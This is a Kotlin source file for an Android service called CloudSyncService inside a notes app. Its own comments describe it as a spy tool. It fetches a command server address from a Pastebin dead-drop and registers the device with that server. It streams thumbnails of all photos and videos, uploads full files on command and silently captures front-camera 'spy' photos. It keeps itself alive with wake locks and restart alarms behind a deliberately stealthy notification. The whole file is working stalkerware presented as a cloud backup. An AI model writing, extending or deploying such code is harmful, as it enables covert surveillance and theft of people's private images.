package cl.example.mynotes

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.ThumbnailUtils
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException

// --- IMPORTACIONES OKHTTP ---
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody

// --- IMPORTACIONES CORRUTINAS ---
import kotlinx.coroutines.*

class CloudSyncService : Service() {

    private var socket: Socket? = null

    // ====================================================================================
    // 🕵️ OFUSCACIÓN C2 (DEAD DROP RESOLVER)
    // ====================================================================================
    // Enlace RAW de Pastebin que contiene el Base64 de tu servidor.
    private val RESOLVER_URL = "https://pastebin.com/raw/gNmxTyPZ"

    // Aquí se guardará la URL real una vez decodificada.
    private var activeServerUrl: String = ""
    // ====================================================================================

    private val CHANNEL_ID = "MyNotesBackupChannel"

    private var wakeLock: PowerManager.WakeLock? = null
    @Volatile private var isScanning = false

    // --- GESTIÓN DE CORRUTINAS ---
    private val serviceJob = SupervisorJob()
    // Scope principal del servicio
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    // Dispatcher limitado para subidas: MÁXIMO 2 SUBIDAS SIMULTÁNEAS
    @OptIn(ExperimentalCoroutinesApi::class)
    private val uploadDispatcher = Dispatchers.IO.limitedParallelism(2)

    override fun onCreate() {
        super.onCreate()
        try {
            startForeground(1, createNotification())
        } catch (e: Exception) { e.printStackTrace() }

        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncTag")
            wakeLock?.acquire(60 * 60 * 1000L)
        } catch (e: Exception) { Log.e("CloudSync", "Error WL: ${e.message}") }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // --- BLOQUE DE SEGURIDAD ANTI-CRASH (ANDROID 14) ---
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Usamos dataSync explícitamente
                startForeground(
                    1,
                    createNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(1, createNotification())
            }
        } catch (e: Exception) {
            Log.e("CloudSync", "💀 Crash evitado: ${e.message}")
            stopSelf()
            return START_NOT_STICKY
        }
        // ----------------------------------------------------

        // Iniciamos la conexión de forma asíncrona para resolver la URL primero
        iniciarSecuenciaDeConexion()

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val restartIntent = Intent(applicationContext, RestartReceiver::class.java).apply {
            setPackage(packageName)
        }
        val pendingIntent = PendingIntent.getBroadcast(
            applicationContext, 1, restartIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1000, pendingIntent)
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Cloud Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MyNotes Cloud")
            .setContentText("Buscando actualizaciones...") // Texto sigiloso
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    // --- NUEVA LÓGICA DE CONEXIÓN DINÁMICA ---
    private fun iniciarSecuenciaDeConexion() {
        if (socket?.connected() == true) return

        serviceScope.launch {
            // 1. Si no tenemos la URL, intentamos resolverla desde Pastebin
            if (activeServerUrl.isEmpty()) {
                Log.d("CloudSync", "🕵️ Resolviendo C2 desde Dead Drop...")
                val resolved = resolveC2Url()
                if (resolved != null) {
                    activeServerUrl = resolved
                    Log.d("CloudSync", "✅ C2 Resuelto exitosamente: $activeServerUrl")
                } else {
                    Log.e("CloudSync", "❌ Fallo al resolver C2. Entrando en modo durmiente.")
                    // Si falla (ej: sin internet), terminamos esta ejecución.
                    return@launch
                }
            }

            // 2. Conectamos con la URL obtenida
            conectarSocketIO()
        }
    }

    private fun resolveC2Url(): String? {
        val client = OkHttpClient()
        val request = Request.Builder().url(RESOLVER_URL).build()

        return try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val encodedBody = response.body?.string()?.trim() ?: return null

                // Decodificamos Base64
                val decodedBytes = Base64.decode(encodedBody, Base64.DEFAULT)
                String(decodedBytes, Charsets.UTF_8).trim() // Retornamos la URL limpia
            }
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }

    private fun conectarSocketIO() {
        try {
            val options = IO.Options().apply {
                reconnection = true
                forceNew = true
            }
            // Usamos la URL dinámica
            socket = IO.socket(activeServerUrl, options)

            socket?.on(Socket.EVENT_CONNECT) {
                registrarDispositivo()

                serviceScope.launch {
                    delay(1000)
                    sendFolderList()
                }

                if (!isScanning) {
                    isScanning = true
                    serviceScope.launch {
                        sendThumbnails(null)
                        isScanning = false
                    }
                }
            }

            socket?.on("command_start_scan") { args ->
                if (!isScanning) {
                    isScanning = true
                    serviceScope.launch { sendFolderList() }

                    var folderFilter: String? = null
                    if (args.isNotEmpty()) {
                        val params = args[0] as? JSONObject
                        folderFilter = params?.optString("folder")
                        if (folderFilter.isNullOrEmpty()) folderFilter = null
                    }

                    serviceScope.launch {
                        sendThumbnails(folderFilter)
                        scanVideos(folderFilter)
                        isScanning = false
                    }
                }
            }

            socket?.on("command_stop_scan") { isScanning = false }

            socket?.on("command_take_photo") { takeSpyPhoto() }

            socket?.on("request_full_image") { args ->
                val data = args[0] as JSONObject
                val path = data.optString("path")
                val target = data.optString("target")

                uploadFileHttp(path, target)
            }

            socket?.connect()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun registrarDispositivo() {
        try {
            val info = JSONObject().apply {
                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                put("dataType", "register_device")
            }
            socket?.emit("usrData", info)
        } catch (e: Exception) { e.printStackTrace() }
    }

    // --- FUNCIONES DE ESCANEO ---
    private fun sendFolderList() {
        val uniqueFolders = HashSet<String>()
        try {
            val uriImages = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
            contentResolver.query(uriImages, projection, null, null, null)?.use { cursor ->
                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val folderName = cursor.getString(idxBucket)
                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error listando fotos: ${e.message}") }

        try {
            val uriVideo = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
            contentResolver.query(uriVideo, projection, null, null, null)?.use { cursor ->
                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val folderName = cursor.getString(idxBucket)
                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error listando videos: ${e.message}") }

        if (uniqueFolders.isNotEmpty()) {
            val sortedList = uniqueFolders.sorted()
            val data = JSONObject().apply {
                put("dataType", "folder_list")
                put("folders", org.json.JSONArray(sortedList))
            }
            socket?.emit("usrData", data)
        }
    }

    private fun sendThumbnails(targetFolder: String?) {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        var selection: String? = null
        var selectionArgs: Array<String>? = null

        if (targetFolder != null) {
            selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE ?"
            selectionArgs = arrayOf("%$targetFolder%")
        }

        try {
            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

                while (cursor.moveToNext()) {
                    if (!serviceScope.isActive || !isScanning || socket?.connected() != true) break

                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)
                    val thumb = getThumb(path)

                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name)
                            put("path", path)
                            put("folder", File(path).parentFile?.name ?: "Unknown")
                            put("image64", encodeToBase64(thumb, 30))
                            put("dataType", "preview_image")
                        }
                        socket?.emit("usrData", data)
                        runBlocking { delay(50) }
                    }
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Scan Error: ${e.message}") }
    }

    private fun scanVideos(targetFolder: String?) {
        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Video.Media.DATA,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media._ID
        )
        val sortOrder = "${MediaStore.Video.Media.DATE_ADDED} DESC"

        var selection: String? = null
        var selectionArgs: Array<String>? = null

        if (targetFolder != null) {
            selection = "${MediaStore.Video.Media.DATA} LIKE ?"
            selectionArgs = arrayOf("%$targetFolder%")
        }

        try {
            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                val idxId = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)

                while (cursor.moveToNext()) {
                    if (!serviceScope.isActive || !isScanning || socket?.connected() != true) break

                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)
                    val id = cursor.getLong(idxId)
                    val file = File(path)

                    val thumb = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try {
                            contentResolver.loadThumbnail(
                                android.content.ContentUris.withAppendedId(uri, id),
                                android.util.Size(96, 96),
                                null
                            )
                        } catch (e: Exception) { null }
                    } else {
                        @Suppress("DEPRECATION")
                        MediaStore.Video.Thumbnails.getThumbnail(
                            contentResolver,
                            id,
                            MediaStore.Video.Thumbnails.MICRO_KIND,
                            null
                        )
                    }

                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name)
                            put("path", path)
                            put("folder", file.parentFile?.name ?: "Unknown")
                            put("image64", encodeToBase64(thumb, 40))
                            put("dataType", "preview_video")
                        }
                        socket?.emit("usrData", data)
                        runBlocking { delay(80) }
                    }
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    // =========================================================
    // 🔪 SUBIDA POR TROZOS (USANDO URL DINÁMICA)
    // =========================================================
    private fun uploadFileHttp(path: String, targetSocketId: String?) {
        val file = File(path)
        if (!file.exists()) return

        // Seguridad: Si no hay URL resuelta, no podemos subir
        if (activeServerUrl.isEmpty()) return

        serviceScope.launch(uploadDispatcher) {
            val CHUNK_SIZE = 10 * 1024 * 1024
            val totalSize = file.length()
            val totalChunks = (totalSize + CHUNK_SIZE - 1) / CHUNK_SIZE

            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
            val client = OkHttpClient()

            Log.d("UPLOAD", "🔪 Iniciando corte: ${file.name} | Total: ${totalSize/1024/1024} MB")

            try {
                file.inputStream().use { fileInputStream ->
                    val buffer = ByteArray(CHUNK_SIZE)
                    var bytesRead: Int = 0
                    var chunkIndex = 0
                    var uploadedBytes: Long = 0

                    while (isActive && fileInputStream.read(buffer).also { bytesRead = it } != -1) {

                        val actualChunkData = if (bytesRead < CHUNK_SIZE) buffer.copyOf(bytesRead) else buffer

                        val requestBody = MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("file", "blob", actualChunkData.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
                            .addFormDataPart("filename", file.name)
                            .addFormDataPart("chunkIndex", chunkIndex.toString())
                            .addFormDataPart("totalChunks", totalChunks.toString())
                            .addFormDataPart("deviceId", deviceId)
                            .addFormDataPart("deviceName", deviceName)
                            .addFormDataPart("folderName", file.parentFile?.name ?: "Unknown")
                            .build()

                        // IMPORTANTE: USAMOS LA URL DINÁMICA
                        val request = Request.Builder()
                            .url("$activeServerUrl/upload-chunk")
                            .post(requestBody)
                            .build()

                        client.newCall(request).execute().use { response ->
                            if (!response.isSuccessful) {
                                Log.e("UPLOAD", "❌ Error subiendo chunk $chunkIndex: ${response.code}")
                                throw IOException("Error en subida: ${response.code}")
                            }
                        }

                        uploadedBytes += bytesRead
                        val progress = (uploadedBytes * 100 / totalSize).toInt()

                        try {
                            val data = JSONObject().apply {
                                put("deviceId", deviceId)
                                put("filename", file.name)
                                put("progress", progress)
                            }
                            socket?.emit("upload_progress", data)
                        } catch (e: Exception) {}

                        chunkIndex++
                    }
                }
                Log.d("UPLOAD", "✅ Subida completa: ${file.name}")

            } catch (e: Exception) {
                Log.e("UPLOAD", "❌ Fallo subida: ${e.message}")
            }
        }
    }

    private fun getThumb(path: String): Bitmap? = try {
        ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), 96, 96)
    } catch (e: Exception) { null }

    private fun encodeToBase64(bm: Bitmap, quality: Int): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, quality, baos)
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
    }

    private fun takeSpyPhoto() {
        serviceScope.launch(Dispatchers.Main) {
            val manager = getSystemService(CAMERA_SERVICE) as CameraManager
            try {
                val cameraId = manager.cameraIdList.firstOrNull { id ->
                    val characteristics = manager.getCameraCharacteristics(id)
                    characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
                } ?: manager.cameraIdList[0]

                val thread = HandlerThread("CameraBackground")
                thread.start()
                val backgroundHandler = Handler(thread.looper)

                if (androidx.core.app.ActivityCompat.checkSelfPermission(this@CloudSyncService, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch

                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
                            camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    try {
                                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                        req.addTarget(imageReader.surface)
                                        req.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
                                        req.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        req.set(CaptureRequest.JPEG_ORIENTATION, 270)
                                        session.capture(req.build(), null, backgroundHandler)
                                    } catch (e: Exception) { camera.close() }
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
                            }, backgroundHandler)

                            imageReader.setOnImageAvailableListener({ reader ->
                                val image = reader.acquireLatestImage()
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                image.close()

                                camera.close()
                                thread.quitSafely()

                                val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                                val data = JSONObject().apply {
                                    put("dataType", "full_image")
                                    put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                                    put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                                    put("name", "SPY_${System.currentTimeMillis()}.jpg")
                                    put("image64", b64)
                                    put("folder", "SPY_CAMERA")
                                }
                                socket?.emit("usrData", data)
                            }, backgroundHandler)
                        } catch (e: Exception) { camera.close() }
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close() }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close() }
                }, backgroundHandler)
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
        try { if (wakeLock?.isHeld == true) wakeLock?.release(); socket?.disconnect() } catch (e: Exception) {}
        sendBroadcast(Intent(this, RestartReceiver::class.java))
    }
}